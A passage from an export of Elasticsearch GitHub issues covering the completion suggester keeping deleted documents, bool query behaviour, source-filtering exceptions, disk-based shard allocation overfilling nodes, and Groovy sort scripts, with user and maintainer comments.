</description><key id="42978160">7761</key><summary>Deleted documents show up in completion suggester</summary><type iconUrl="" id="" /><priority iconUrl="" id="" /><status description="" iconUrl="" id="">closed</status><statusCategory colorName="" id="" key="" /><resolution colorName="" id="" /><assignee username="">None</assignee><reporter username="">ankitkr</reporter><labels /><created>2014-09-17T08:21:16Z</created><updated>2016-09-18T03:14:24Z</updated><resolved>2014-09-18T19:11:15Z</resolved><version /><fixVersion /><component /><due /><votes /><watches /><comments><comment author="areek" created="2014-09-18T16:54:15Z" id="56068848">This is a known issue for the current completion suggester. There has been progress made to fix this, along with other enhancements/imporvements, but the support for the new completion suggester implementation in ES is still not in place. (see https://github.com/elasticsearch/elasticsearch/pull/7353, https://github.com/elasticsearch/elasticsearch/pull/7650)
</comment><comment author="s1monw" created="2014-09-18T19:11:15Z" id="56087470">it's not a bug it's a feature at this point. We are working on fixes - closing.
</comment><comment author="tvdavid" created="2014-10-03T22:04:28Z" id="57869571">Should the status of this bug perhaps be reflected more clearly in the completion suggester's documentation? It currently reads `The suggest data structure might not reflect deletes on documents immediately. You may need to do an Optimize for that`, while in reality it's very easy to get deleted documents stuck in the index with no way at all to purge them out.
</comment><comment author="cari-cm" created="2015-04-14T22:01:30Z" id="93083132">How can you say it's a feature and then say you are working on fixes?  Admit it's a bug.  It would be really nice if there was a fix to this BUG prior to 2.0!  
</comment><comment author="gitazem" created="2015-09-23T09:11:54Z" id="142536683">What situation is on this bug ? How can i solve it ? I am trying many workarounds -- and nothing. this is still don't work "_optimize?only_expunge_deletes=true&amp;max_num_segments=1&amp;force=true&amp;refresh=true" 
any suggestions ? 
</comment><comment author="clintongormley" created="2015-09-23T12:57:53Z" id="142591065">@gitazem the new completion suggester coming in 2.1 solves this problem
</comment><comment author="chape" created="2016-01-22T02:37:56Z" id="173784098">@clintongormley Have 2.1.1 fixed it problem yet? I don't see it in 2.1.0&amp;2.1.1 release notes.
</comment><comment author="clintongormley" created="2016-01-22T12:07:56Z" id="173900949">It was bumped to 2.2.0, but now we've just bumped it to 3.0 because it has breaking changes, unfortunately.
</comment><comment author="chape" created="2016-01-25T03:59:46Z" id="174387719">@clintongormley  thank you for response
</comment><comment author="drush" created="2016-02-19T21:32:43Z" id="186416623">@clintongormley Can you re-open this issue as a bug, since it is in fact OPEN, and a BUG?  kthxbye
</comment><comment author="majksner" created="2016-03-17T13:47:33Z" id="197886266">This issue is still actual. I'm using 2.2.1
</comment><comment author="s1monw" created="2016-03-17T13:50:16Z" id="197886929">@drush it's not a bug always advertised as such 
@majksner it will not come until 5.0
</comment><comment author="drush" created="2016-03-19T00:52:09Z" id="198595509">It is absolutely a bug @s1monw Per your docs on completion suggesters:

https://www.elastic.co/guide/en/elasticsearch/reference/current/search-suggesters-completion.html
"NOTE: The suggest data structure might not reflect deletes on documents immediately. You may need to do an Optimize for that. You can call optimize with the only_expunge_deletes=true to only target deletions for merging."

DELETES do NOT work on suggesters even with this optimize operation.  This suggestion does not in-fact solve the problem, so the bug is that it is NOT possible to delete documents without destroying the entire index.

If you are suggesting that you support a DELETE operation on suggester indexes but that the DELETE operation is never expected to work, then you need to demote this entire feature to 'Experimental' or 'Alpha' rather than a production capability.

The documentation is lacking at best and deceiving at worst.  I would suggest re-evaluating this issue for proper prioritization.
</comment><comment author="s1monw" created="2016-03-19T13:25:04Z" id="198703250">@drush I take these complaints serious so I added a test for your that makes sure the feature works as documented. (https://github.com/elastic/elasticsearch/commit/5fa543867f8cbd0ffde504f495d33cadc8c335ee) 

The downside of the implementation (which me and @mikemccand basically wrote years ago) is that it's a very optimized data-structure and the enhancements that we are shipping in the next major version will resolve this issue. 

Believe me I see a lot of people that try to be loud on issues like this just like you try to. That's fine, I can't change that. What I can change is to let you know that it doesn't help, it is counter productive. You don't like the progress over perfection approach we are practicing! This feature has already as it is provided huge improvements do large scale suggest applications, it's not perfect as documented. 
We are shipping the improvement that you may need in the next major, back-porting is not an option.

Again, you may be heard in your environment when you are loud, in this environment you may just be shown wrong and we move on.
</comment><comment author="s1monw" created="2016-03-21T08:35:17Z" id="199174045">@drush Just FYI I tried to clarify the documentation and added a possible caveat to the documentation. 
</comment></comments><attachments /><subtasks /><customfields /></item><item><title>Update count.asciidoc</title><link>https://api.github.com/repos/elastic/elasticsearch/issues/7760</link><project id="" key="" /><description /><key id="42975865">7760</key><summary>Update count.asciidoc</summary><type iconUrl="" id="" /><priority iconUrl="" id="" /><status description="" iconUrl="" id="">closed</status><statusCategory colorName="" id="" key="" /><resolution colorName="" id="" /><assignee username="">None</assignee><reporter username="">garyelephant</reporter><labels /><created>2014-09-17T07:57:13Z</created><updated>2014-09-24T19:21:04Z</updated><resolved>2014-09-24T19:21:04Z</resolved><version /><fixVersion /><component /><due /><votes /><watches /><comments><comment author="clintongormley" created="2014-09-24T19:21:04Z" id="56723888">HI @garyelephant 

Actually, the orginal version is correct :)

thanks anyway
</comment></comments><attachments /><subtasks /><customfields /></item><item><title>Boolean query with 1 term in `must` and 1 term in `should` finds record where the should field does not exist</title><link>https://api.github.com/repos/elastic/elasticsearch/issues/7759</link><project id="" key="" /><description>```
$ curl -XGET "http://localhost:9200"
{
  "status" : 200,
  "name" : "Equilibrius",
  "version" : {
    "number" : "1.3.2",
    "build_hash" : "dee175dbe2f254f3f26992f5d7591939aaefd12f",
    "build_timestamp" : "2014-08-13T14:29:30Z",
    "build_snapshot" : false,
    "lucene_version" : "4.9"
  },
  "tagline" : "You Know, for Search"
}
$ curl -XPOST "http://localhost:9200/b-stc-d63fded1-043c-43ad-9135-d96b6d16cced-v20140916033807%2Cu-localhost-stc-d63fded1-043c-43ad-9135-d96b6d16cced-v20140916033807/_search?pretty=true" -d '
{
  "explain": true,
  "_source": [
    "stc_parent"
  ],
  "query": {
    "bool": {
      "must": [
        {
          "term": {
            "stc_owner": "e4a8c0e4-0971-414b-8eee-d9a262dbb2df"
          }
        }
      ],
      "should": [
        {
          "term": {
            "stc_parent": "4fad3fbf-0563-4df6-86e3-704f7a67b74e"
          }
        },
        {
          "term": {
            "stc_parent": "f5b12506-d119-4408-b593-4b098128a299"
          }
        }
      ],
    }
  }
}'
```

Some of the returned hits don't have an stc_owner property.
For example: the first hist is missing the property all together and the second one does have such a property.

```
{
  "took" : 10,
  "timed_out" : false,
  "_shards" : {
    "total" : 2,
    "successful" : 2,
    "failed" : 0
  },
  "hits" : {
    "total" : 6,
    "max_score" : 2.1855037,
    "hits" : [ {
      "_shard" : 0,
      "_node" : "2U05i7A-Qg60eM0a5iPw4A",
      "_index" : "b-stc-d63fded1-043c-43ad-9135-d96b6d16cced-v20140916033807",
      "_type" : "stc_user",
      "_id" : "e4a8c0e4-0971-414b-8eee-d9a262dbb2df",
      "_score" : 2.1855037,
      "_source":{},
      "_explanation" : {
        "value" : 2.1855037,
        "description" : "product of:",
        "details" : [ {
          "value" : 6.556511,
          "description" : "sum of:",
          "details" : [ {
            "value" : 6.556511,
            "description" : "weight(stc_owner:e4a8c0e4-0971-414b-8eee-d9a262dbb2df in 6498) [PerFieldSimilarity], result of:",
            "details" : [ {
              "value" : 6.556511,
              "description" : "score(doc=6498,freq=1.0 = termFreq=1.0\n), product of:",
              "details" : [ {
                "value" : 0.61388034,
                "description" : "queryWeight, product of:",
                "details" : [ {
                  "value" : 10.680438,
                  "description" : "idf(docFreq=1, maxDocs=32003)"
                }, {
                  "value" : 0.057477076,
                  "description" : "queryNorm"
                } ]
              }, {
                "value" : 10.680438,
                "description" : "fieldWeight in 6498, product of:",
                "details" : [ {
                  "value" : 1.0,
                  "description" : "tf(freq=1.0), with freq of:",
                  "details" : [ {
                    "value" : 1.0,
                    "description" : "termFreq=1.0"
                  } ]
                }, {
                  "value" : 10.680438,
                  "description" : "idf(docFreq=1, maxDocs=32003)"
                }, {
                  "value" : 1.0,
                  "description" : "fieldNorm(doc=6498)"
                } ]
              } ]
            } ]
          } ]
        }, {
          "value" : 0.33333334,
          "description" : "coord(1/3)"
        } ]
      }
    }, {
      "_shard" : 0,
      "_node" : "2U05i7A-Qg60eM0a5iPw4A",
      "_index" : "u-localhost-stc-d63fded1-043c-43ad-9135-d96b6d16cced-v20140916033807",
      "_type" : "stc_page",
      "_id" : "939ad133-5cd1-4132-a43a-037519dc1335",
      "_score" : 1.8167212,
      "_source":{"stc_parent":"4fad3fbf-0563-4df6-86e3-704f7a67b74e"},
      "_explanation" : {
        "value" : 1.8167212,
        "description" : "product of:",
        "details" : [ {
          "value" : 2.7250817,
          "description" : "sum of:",
          "details" : [ {
            "value" : 0.7521613,
            "description" : "weight(stc_owner:e4a8c0e4-0971-414b-8eee-d9a262dbb2df in 0) [PerFieldSimilarity], result of:",
            "details" : [ {
              "value" : 0.7521613,
              "description" : "score(doc=0,freq=1.0 = termFreq=1.0\n), product of:",
              "details" : [ {
                "value" : 0.42418543,
                "description" : "queryWeight, product of:",
                "details" : [ {
                  "value" : 1.7731899,
                  "description" : "idf(docFreq=5, maxDocs=13)"
                }, {
                  "value" : 0.23922166,
                  "description" : "queryNorm"
                } ]
              }, {
                "value" : 1.7731899,
                "description" : "fieldWeight in 0, product of:",
                "details" : [ {
                  "value" : 1.0,
                  "description" : "tf(freq=1.0), with freq of:",
                  "details" : [ {
                    "value" : 1.0,
                    "description" : "termFreq=1.0"
                  } ]
                }, {
                  "value" : 1.7731899,
                  "description" : "idf(docFreq=5, maxDocs=13)"
                }, {
                  "value" : 1.0,
                  "description" : "fieldNorm(doc=0)"
                } ]
              } ]
            } ]
          }, {
            "value" : 1.9729203,
            "description" : "weight(stc_parent:4fad3fbf-0563-4df6-86e3-704f7a67b74e in 0) [PerFieldSimilarity], result of:",
            "details" : [ {
              "value" : 1.9729203,
              "description" : "score(doc=0,freq=1.0 = termFreq=1.0\n), product of:",
              "details" : [ {
                "value" : 0.6869973,
                "description" : "queryWeight, product of:",
                "details" : [ {
                  "value" : 2.871802,
                  "description" : "idf(docFreq=1, maxDocs=13)"
                }, {
                  "value" : 0.23922166,
                  "description" : "queryNorm"
                } ]
              }, {
                "value" : 2.871802,
                "description" : "fieldWeight in 0, product of:",
                "details" : [ {
                  "value" : 1.0,
                  "description" : "tf(freq=1.0), with freq of:",
                  "details" : [ {
                    "value" : 1.0,
                    "description" : "termFreq=1.0"
                  } ]
                }, {
                  "value" : 2.871802,
                  "description" : "idf(docFreq=1, maxDocs=13)"
                }, {
                  "value" : 1.0,
                  "description" : "fieldNorm(doc=0)"
                } ]
              } ]
            } ]
          } ]
        }, {
          "value" : 0.6666667,
          "description" : "coord(2/3)"
        } ]
      }
    }
(...)
```

One possible workaround consists of rewriting the query as

```
must: [
  { term: { stc_owner: 'abc' } },
  { terms: { stc_parent: [ 'def', 'ghj' ] } }
]
```
</description><key id="42960254">7759</key><summary>Boolean query with 1 term in `must` and 1 term in `should` finds record where the should field does not exist</summary><type iconUrl="" id="" /><priority iconUrl="" id="" /><status description="" iconUrl="" id="">closed</status><statusCategory colorName="" id="" key="" /><resolution colorName="" id="" /><assignee username="">None</assignee><reporter username="">hmalphettes</reporter><labels /><created>2014-09-17T03:36:56Z</created><updated>2014-09-24T19:19:42Z</updated><resolved>2014-09-24T19:19:42Z</resolved><version /><fixVersion /><component /><due /><votes /><watches /><comments><comment author="hmalphettes" created="2014-09-17T03:44:11Z" id="55845494">@clintongormley I apologise for the noise:
I carefully prepared this PT then realised I had omitted to add:
`"minimum_should_match": 1`
to the boolean query.

Adding `minimum_should_match: 1` explicitly solves the problem.
I got confused reading the doc and assumed that it was implicit: it looks like it makes a difference.
</comment><comment author="clintongormley" created="2014-09-24T19:19:42Z" id="56723711">glad you figured it out :)
</comment></comments><attachments /><subtasks /><customfields /></item><item><title>Better handling when attempting to search with source filtering against docs with disabled source</title><link>https://api.github.com/repos/elastic/elasticsearch/issues/7758</link><project id="" key="" /><description>Reproducible using Java API 1.3.x.  See repro at :  https://gist.github.com/ppf2/1a14a31b3add6c450c10

In short, if you have a doc type with source disabled and if you attempt to use the Java API to search for docs of this type specifying source filtering via SearchSourceBuilder, you will receive an unintuitive exception:

``` java
Exception in thread "main" org.elasticsearch.action.search.SearchPhaseExecutionException: Failed to execute phase [query_fetch], all shards failed; shardFailures {[bqSWDvHIT7WCtEJKymhnHA][disable_source][0]: ElasticsearchIllegalArgumentException[No matching content type for null]}
```
</description><key id="42953725">7758</key><summary>Better handling when attempting to search with source filtering against docs with disabled source</summary><type iconUrl="" id="" /><priority iconUrl="" id="" /><status description="" iconUrl="" id="">closed</status><statusCategory colorName="" id="" key="" /><resolution colorName="" id="" /><assignee username="">None</assignee><reporter username="">ppf2</reporter><labels><label>:Search</label><label>adoptme</label><label>bug</label><label>low hanging fruit</label></labels><created>2014-09-17T01:34:25Z</created><updated>2016-08-27T11:24:45Z</updated><resolved>2016-08-27T11:24:45Z</resolved><version /><fixVersion /><component /><due /><votes /><watches /><comments><comment author="cristiboariu" created="2015-08-13T12:39:59Z" id="130655230">+1
</comment><comment author="qwerty4030" created="2016-08-20T21:37:25Z" id="241225095">On latest master this causes an NPE. I'll take a look, it seems like a similar fix to #18957.

```
PUT disable_source
{
  "settings": {
    "number_of_replicas": 0,
    "number_of_shards": 1
  },
  "mappings": {
    "type": {
      "_source": {
        "enabled": false
      }
    }
  }
}

POST disable_source/type/1
{
  "text1": "hello1",
  "text2": "hello2"
}

POST disable_source/_search
{
  "_source": [
    "text1",
    "text2"
  ]
}
```

NPE response:

```
{
   "error": {
      "root_cause": [
         {
            "type": "null_pointer_exception",
            "reason": null
         }
      ],
      "type": "search_phase_execution_exception",
      "reason": "all shards failed",
      "phase": "query_fetch",
      "grouped": true,
      "failed_shards": [
         {
            "shard": 0,
            "index": "disable_source",
            "node": "71DMW_mRRzKDjQFNDpU4Iw",
            "reason": {
               "type": "null_pointer_exception",
               "reason": null
            }
         }
      ],
      "caused_by": {
         "type": "null_pointer_exception",
         "reason": null
      }
   },
   "status": 500
}
```
</comment></comments><attachments /><subtasks /><customfields /></item><item><title>Nest original exception while creating NoShardAvailableActionException</title><link>https://api.github.com/repos/elastic/elasticsearch/issues/7757</link><project id="" key="" /><description>Nest original exception while creating NoShardAvailableActionException
Closes #7756
</description><key id="42949836">7757</key><summary>Nest original exception while creating NoShardAvailableActionException</summary><type iconUrl="" id="" /><priority iconUrl="" id="" /><status description="" iconUrl="" id="">closed</status><statusCategory colorName="" id="" key="" /><resolution colorName="" id="" /><assignee username="">None</assignee><reporter username="">suyograo</reporter><labels><label>:Exceptions</label><label>enhancement</label><label>v1.4.0</label><label>v1.5.0</label><label>v2.0.0-beta1</label></labels><created>2014-09-17T00:32:43Z</created><updated>2015-06-07T10:33:32Z</updated><resolved>2014-09-29T21:33:12Z</resolved><version /><fixVersion /><component /><due /><votes /><watches /><comments><comment author="s1monw" created="2014-09-24T20:03:29Z" id="56729786">LGTM
</comment><comment author="suyograo" created="2014-09-29T21:33:12Z" id="57233717">Closed via https://github.com/elasticsearch/elasticsearch/commit/25bce1db5ddbaada99e87fc76ae1ab3125228441
</comment></comments><attachments /><subtasks /><customfields /></item><item><title>NoShardAvailableActionException - Nest the original exception</title><link>https://api.github.com/repos/elastic/elasticsearch/issues/7756</link><project id="" key="" /><description>In `TransportShardSingleOperationAction.AsyncSingleAction.perform` we create a new `NoShardAvailableActionException` without nesting the original exception. 

``` java
if (failure == null || isShardNotAvailableException(failure)) {
    failure = new NoShardAvailableActionException(shardIt.shardId());
```

It would be useful to know what exactly happened when looking at stack traces like this

``` java
Caused by: org.elasticsearch.action.NoShardAvailableActionException: [.scripts][4] null 
at org.elasticsearch.action.support.single.shard.TransportShardSingleOperationAction$AsyncSingleAction.perform(TransportShardSingleOperationAction.java:144) 
at org.elasticsearch.action.support.single.shard.TransportShardSingleOperationAction$AsyncSingleAction.start(TransportShardSingleOperationAction.java:124) 
at org.elasticsearch.action.support.single.shard.TransportShardSingleOperationAction.doExecute(TransportShardSingleOperationAction.java:72) 
at org.elasticsearch.action.support.single.shard.TransportShardSingleOperationAction.doExecute(TransportShardSingleOperationAction.java:49) 
at org.elasticsearch.action.support.TransportAction.execute(TransportAction.java:65) 
at org.elasticsearch.client.node.NodeClient.execute(NodeClient.java:92) 
at org.elasticsearch.client.support.AbstractClient.get(AbstractClient.java:189) 
at org.elasticsearch.action.get.GetRequestBuilder.doExecute(GetRequestBuilder.java:196) 
at org.elasticsearch.action.ActionRequestBuilder.execute(ActionRequestBuilder.java:91) 
at org.elasticsearch.action.ActionRequestBuilder.execute(ActionRequestBuilder.java:65) 
at org.elasticsearch.action.ActionRequestBuilder.get(ActionRequestBuilder.java:73) 
at org.elasticsearch.script.ScriptService.queryScriptIndex(ScriptService.java:385) 
at org.elasticsearch.script.ScriptService.queryScriptIndex(ScriptService.java:379) 
at org.elasticsearch.script.ScriptService.getScriptFromIndex(ScriptService.java:401) 
at org.elasticsearch.script.ScriptService.compile(ScriptService.java:309) 
at org.elasticsearch.script.ScriptService.executable(ScriptService.java:497) 
at org.elasticsearch.action.update.UpdateHelper.prepare(UpdateHelper.java:149)

```
</description><key id="42949127">7756</key><summary>NoShardAvailableActionException - Nest the original exception</summary><type iconUrl="" id="" /><priority iconUrl="" id="" /><status description="" iconUrl="" id="">closed</status><statusCategory colorName="" id="" key="" /><resolution colorName="" id="" /><assignee username="">{u'following_url': u'https://api.github.com/users/suyograo/following{/other_user}', u'events_url': u'https://api.github.com/users/suyograo/events{/privacy}', u'organizations_url': u'https://api.github.com/users/suyograo/orgs', u'url': u'https://api.github.com/users/suyograo', u'gists_url': u'https://api.github.com/users/suyograo/gists{/gist_id}', u'html_url': u'https://github.com/suyograo', u'subscriptions_url': u'https://api.github.com/users/suyograo/subscriptions', u'avatar_url': u'https://avatars1.githubusercontent.com/u/1595958?v=4', u'repos_url': u'https://api.github.com/users/suyograo/repos', u'received_events_url': u'https://api.github.com/users/suyograo/received_events', u'gravatar_id': u'', u'starred_url': u'https://api.github.com/users/suyograo/starred{/owner}{/repo}', u'site_admin': False, u'login': u'suyograo', u'type': u'User', u'id': 1595958, u'followers_url': u'https://api.github.com/users/suyograo/followers'}</assignee><reporter username="">suyograo</reporter><labels /><created>2014-09-17T00:20:57Z</created><updated>2014-09-29T21:24:51Z</updated><resolved>2014-09-29T21:24:51Z</resolved><version /><fixVersion /><component /><due /><votes /><watches /><comments /><attachments /><subtasks /><customfields /></item><item><title>[DOCS] Indicate that the Children Aggregation is coming in 1.4.0</title><link>https://api.github.com/repos/elastic/elasticsearch/issues/7755</link><project id="" key="" /><description>Related to #6936
</description><key id="42947407">7755</key><summary>[DOCS] Indicate that the Children Aggregation is coming in 1.4.0</summary><type iconUrl="" id="" /><priority iconUrl="" id="" /><status description="" iconUrl="" id="">closed</status><statusCategory colorName="" id="" key="" /><resolution colorName="" id="" /><assignee username="">None</assignee><reporter username="">jsnod</reporter><labels /><created>2014-09-16T23:52:23Z</created><updated>2014-09-17T07:24:15Z</updated><resolved>2014-09-17T07:24:15Z</resolved><version /><fixVersion /><component /><due /><votes /><watches /><comments><comment author="martijnvg" created="2014-09-17T07:24:15Z" id="55858053">Pushed your change, thanks @afx114!
</comment></comments><attachments /><subtasks /><customfields /></item><item><title>Fix `percent_terms_to_match`</title><link>https://api.github.com/repos/elastic/elasticsearch/issues/7754</link><project id="" key="" /><description>The parameter `percent_terms_to_match` (number of terms that must match in the
generated query) was wrongly set to the top level boolean query. This would
lead to zero or all results type of situations. This commit ensures that the
parameter is indeed applied to the query of generated terms.
</description><key id="42944504">7754</key><summary>Fix `percent_terms_to_match`</summary><type iconUrl="" id="" /><priority iconUrl="" id="" /><status description="" iconUrl="" id="">closed</status><statusCategory colorName="" id="" key="" /><resolution colorName="" id="" /><assignee username="">None</assignee><reporter username="">alexksikes</reporter><labels><label>:More Like This</label><label>bug</label><label>v1.4.0</label><label>v2.0.0-beta1</label></labels><created>2014-09-16T23:05:39Z</created><updated>2015-06-07T18:44:08Z</updated><resolved>2014-09-25T07:58:57Z</resolved><version /><fixVersion /><component /><due /><votes /><watches /><comments><comment author="s1monw" created="2014-09-24T20:07:26Z" id="56730398">LGTM Yet - I think we should really support the common [syntax](http://www.elasticsearch.org/guide/en/elasticsearch/reference/current/query-dsl-minimum-should-match.html) for minimum should match and use `Queries#applyMinimumShouldMatch` for it. but we can do that in a different issue?
</comment><comment author="alexksikes" created="2014-09-25T07:35:15Z" id="56784013">That would definitely be nice. However, I'd prefer to do it in another commit. This commit fixes a bug introduced when switching to using the TVs API (https://github.com/elasticsearch/elasticsearch/pull/7014/files#diff-8790389477fb6c598af492a8e673f858R153), which is a 1.4beta release.
</comment><comment author="s1monw" created="2014-09-25T07:42:47Z" id="56784800">yeah lets open a different issue. so LGTM :)
</comment></comments><attachments /><subtasks /><customfields /></item><item><title>Disk decider can allocate more data than the node can handle</title><link>https://api.github.com/repos/elastic/elasticsearch/issues/7753</link><project id="" key="" /><description>We had a disk full event recently that exposed a potentially dangerous behavior of the disk-based shard allocation.

It appears that the disk-based allocation algorithm checks to see whether shards will fit on a node and disallows shards that would increase the usage past the high watermark. That's good. But in our case, the disks filled up anyway.

We had a cluster where every node's data partition was close to full. When a node (we'll call it node A) ran out of space, most of the shards allocated to it failed and were deleted. This took it very close to the low watermark, but not quite under. Later, an unknown event (possibly a merge, possibly a human doing something) freed more space and brought disk usage back under the low watermark. Elasticsearch allocated a few of the failed shards from before back to the same node. However, recovery of those shards failed due to disk full errors.

At roughly the same time, another node in the cluster (node B) ran out of disk and failed a bunch of shards.

I believe the recovery failed because two events triggered allocation at roughly the same time. The first caused the disk-based allocator to allocate some shards to the node. While those shards were initializing, the second event caused another instance of the allocator to allocate even more shards to the same node.

Does the disk-based allocator consider the expected disk usage after current recoveries are finished, or does it ignore current recoveries?

Unfortunately I don't have logs of allocation decisions, so I don't know exactly which shards were allocated where. I know that all the shards that failed recovery were originally allocated to node A. It's possible that none of the shards from node B were actually allocated to node A.

Regardless of what actually happened, I'm hoping that someone can explain to me what the disk-based allocator would be expected to do in the above case where there are two allocation events in a short time.
</description><key id="42940976">7753</key><summary>Disk decider can allocate more data than the node can handle</summary><type iconUrl="" id="" /><priority iconUrl="" id="" /><status description="" iconUrl="" id="">closed</status><statusCategory colorName="" id="" key="" /><resolution colorName="" id="" /><assignee username="">{u'following_url': u'https://api.github.com/users/dakrone/following{/other_user}', u'events_url': u'https://api.github.com/users/dakrone/events{/privacy}', u'organizations_url': u'https://api.github.com/users/dakrone/orgs', u'url': u'https://api.github.com/users/dakrone', u'gists_url': u'https://api.github.com/users/dakrone/gists{/gist_id}', u'html_url': u'https://github.com/dakrone', u'subscriptions_url': u'https://api.github.com/users/dakrone/subscriptions', u'avatar_url': u'https://avatars3.githubusercontent.com/u/19060?v=4', u'repos_url': u'https://api.github.com/users/dakrone/repos', u'received_events_url': u'https://api.github.com/users/dakrone/received_events', u'gravatar_id': u'', u'starred_url': u'https://api.github.com/users/dakrone/starred{/owner}{/repo}', u'site_admin': False, u'login': u'dakrone', u'type': u'User', u'id': 19060, u'followers_url': u'https://api.github.com/users/dakrone/followers'}</assignee><reporter username="">grantr</reporter><labels /><created>2014-09-16T22:23:12Z</created><updated>2014-09-25T19:04:26Z</updated><resolved>2014-09-19T10:47:53Z</resolved><version /><fixVersion /><component /><due /><votes /><watches /><comments><comment author="bluelu" created="2014-09-18T10:50:17Z" id="56022929">Hi, we have hit the same issue multiple times (version 1.0.2):

This should easily be able to be tested when restarting a cluster.

Our disk load is about 70% on average with 3 shards per node, before we restart the cluster. If we restart the cluster, elasticsearch allocates sometimes more than 2-3 more shards to some of these nodes, even though that node's disk is already nearly full. (limits are set to 65% don't allocate, and 95% move away). At the end these nodes won't have more than 4 shards "active", but there are still "unused" shards on the node which server as backup copies if the recovery from the primary fails (as we restarted the cluster). 

The main issue is, that new allocation does not seem to take into consideration the expected shard size of the primary.

Then after a few minutes, nodes start running completely full and we have to manually aboard the relocation process to these nodes.
</comment><comment author="dakrone" created="2014-09-18T10:52:08Z" id="56023073">&gt; Does the disk-based allocator consider the expected disk usage after current recoveries are finished, or does it ignore current recoveries?

It only considers the expected disk after the shard in question has completed relocation to the node. The size is independently considered for each shard, because `AllocationDecider`s are considered to be semi-stateless and run in multiple simulations.

&gt; I'm hoping that someone can explain to me what the disk-based allocator would be expected to do in the above case where there are two allocation events in a short time.

The disk usage and shard allocation is a bit more complex, because in order to determine the free disk usage we need to poll at an interval for the amount of disk space used, since the `AllocationDecider.canAllocate` can sometimes be run thousands of times in a second depending on the size of a cluster (we can't run a nodes stats request every time it's run to get a fresh disk usage). This is why the `InternalClusterInfoService` has an interval (`cluster.info.update.interval`) to get new disk information every 30 seconds by default.

So here's what can happen if not careful:
- Node A is sitting at 74% disk usage, the low watermark is 75%.
- FS stats are gathered
- Master decides to allocate a shard to node A, sees it's under the low watermark, and starts relocation
- Relocation finishes, Node A is now at 80% usage
- Master decides to allocate another shard to node A, it's still under the low watermark because new fs stats haven't been gathered yet
- Relocation finishes, even though Node A didn't have room for it!
- FS stats are gathered
- Master finally sees Node A is now above the high watermark and can try to relocate data away from it

This is worst-case scenario. There are a few ways to address this.

First, the interval for the cluster info update can be shortened, so that FS information is gathered more frequently.

Second, the `cluster.routing.allocation.cluster_concurrent_rebalance` can be lowered, the default is 2 (I don't know if you raised this or not), but lowering it to 1 means that only a single shard can be rebalanced, which will help have more "even" knowledge of the disk usages. You can also lower the 

For future debugging, to log what ES thinks the current sizes are, you can enable TRACE logging for `cluster.InternalClusterInfoService` and it will log the retrieved sizes, or `cluster.routing.allocation.decider.DiskThresholdDecider` to log information about the allocation decisions.

I will also try to think of a better way to prevent this situation from happening in the future.
</comment><comment author="bluelu" created="2014-09-18T11:02:48Z" id="56023900">@dakrone 

Could it be that when the master allocates a shard, that it only takes into consideration hd usage and the predicted size of that shard, but not the ones which haven't yet recovered/initialised and where it did the same operation just before? In our case relocation will never finish.

I'm not sure, but I think cluster_concurrent_rebalance has any effect when you do a cluster restart as primaries and replicas need to be allocated.
Also an out of date FS information should have no affect on our case.

That would explain why we see this behaviour at cluster restart
</comment><comment author="dakrone" created="2014-09-18T11:09:09Z" id="56024403">@bluelu:

&gt; Could it be that when the master allocates a shard, that it only takes into consideration hd usage and the predicted size of that shard, but not the ones which haven't yet recovered/initialised and where it did the same operation just before?

It _does_ take disk usage into account (through the ClusterInfoService) and predicted size of that shard, however it _does not_ take into account the final, total size of shards that are currently relocating to the node.

So the decider looking at a node with 0% disk usage evaluating a shard that's 5gb will see that the node will end up with 5gb of used space, even if there are `n` other relocations of other shards to this node that just started.
</comment><comment author="dakrone" created="2014-09-18T11:16:30Z" id="56024979">I think it might be possible to get the list of other shards currently relocating to a node and factor their size into the final disk usage total, if this solution sounds like it would be useful for you @bluelu @grantr , however, it would be good to confirm the source of the issue (if it is indeed multiple relocations being evaluated independently) first. Turning on the logging I mentioned above would be helpful if you see the issue again!
</comment><comment author="bluelu" created="2014-09-18T11:22:42Z" id="56025488">Sounds like the exact solution for the problem we have.
</comment><comment author="dakrone" created="2014-09-18T11:26:31Z" id="56025792">I believe this may also help with #6168 /cc @gibrown
</comment><comment author="bluelu" created="2014-09-18T12:00:35Z" id="56028655">Yes, we run into this if we don't manually intervene like we do now.
</comment><comment author="TwP" created="2014-09-18T17:06:20Z" id="56070486">@dakrone we have run into this situation before where the available disk space calculation did not take into account in progress relocations. When @drewr was helping us recover a cluster, he recommended setting the number of concurrent relocations to1 in order to prevent this from happening.

I can drop more details in here when I'm back in front of a computer.
</comment><comment author="grantr" created="2014-09-18T17:17:11Z" id="56071996">&gt; You can also lower the

You can also lower the what? Inquiring minds want to know ;)
</comment><comment author="dakrone" created="2014-09-19T10:22:55Z" id="56160529">&gt; You can also lower the what? Inquiring minds want to know ;)

Whoops sorry! I meant to say lower the speed at which the shard is recovered (through throttling), to give the `InternalClusterInfoService` more time to gather updated information, but that is not as ideal as taking the relocations into account.
</comment></comments><attachments /><subtasks /><customfields /></item><item><title>_score in sort script with Groovy</title><link>https://api.github.com/repos/elastic/elasticsearch/issues/7752</link><project id="" key="" /><description>I use ES 1.3.2.

My query:

```
{
  "track_scores": true,
  "sort": {
    "_script": {
      "lang": "groovy",
      "script": "return _score",
      "type": "number"
    }
  }
}
```

Result hit:

```
{
_index: xxxx
_type: xxxx
_id: xxxxx
_score: 1
sort: [
0
]
}
```

Why is my sort equal to 0?
</description><key id="42903341">7752</key><summary>_score in sort script with Groovy</summary><type iconUrl="" id="" /><priority iconUrl="" id="" /><status description="" iconUrl="" id="">closed</status><statusCategory colorName="" id="" key="" /><resolution colorName="" id="" /><assignee username="">None</assignee><reporter username="">pierrre</reporter><labels /><created>2014-09-16T16:35:52Z</created><updated>2014-09-22T16:18:48Z</updated><resolved>2014-09-22T16:18:48Z</resolved><version /><fixVersion /><component /><due /><votes /><watches /><comments><comment author="brwe" created="2014-09-22T15:13:05Z" id="56388139">In 1.3 you have to use `doc.score()` if you want to use the score in aggregations and sorting and `_score` if you use it in a script score. From 1.4 on it will be `_score` only, see #7819
</comment><comment author="pierrre" created="2014-09-22T16:18:48Z" id="56398576">ok, thank you.
</comment></comments><attachments /><subtasks /><customfields /></item><item><title>[Feature] Geopolygon filter - Even-odd &amp; Non-zero rules</title><link>https://api.github.com/repos/elastic/elasticsearch/issues/7751</link><project id="" key="" /><description>Right now it seems that elasticsearch only supports by default even-odd filling for the geopolygon filter.

It would be great to add an option to choose  between even even-odd &amp; non-zero, especially since some browser `&lt;canvas&gt;` only supports non-zero filling. 

This can lead to situations where you don't have a hole in your web polygon but you have one in elastic, and results that should pop out don't.

See [https://en.wikipedia.org/wiki/Nonzero-rule](https://en.wikipedia.org/wiki/Nonzero-rule)

:-)
